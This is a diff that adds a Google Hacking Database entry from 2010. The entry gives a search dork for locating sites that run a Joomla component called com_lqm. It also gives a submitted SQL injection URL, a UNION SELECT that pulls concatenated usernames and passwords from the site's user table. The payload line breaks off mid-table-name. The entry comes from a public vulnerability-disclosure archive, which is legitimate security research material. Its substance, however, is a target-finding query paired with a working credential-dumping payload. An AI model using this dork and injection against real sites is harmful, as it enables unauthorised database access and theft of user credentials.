@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3628
+Category:         Advisories and Vulnerabilities
+Published Date:   2010-12-05
+Author:           anonymous
+GoogleDork:       inurl:index.php?option=com_lqm "showResults"
+Description:      inurl:index.php?option=com_lqm "showResults"
+
+
+Submitter: Snakespc SQL Injection: http://server/index.php?option=com_lqm&amp;query=7&amp;task=showResults&amp;Itemid=158&amp;lang=en&amp;lqm_individual_id=-223+UNION SELECT 1,2,3,4,5,concat(username,0x3a,password),7,8,9,10,11,12+from+cil_site.jos_us
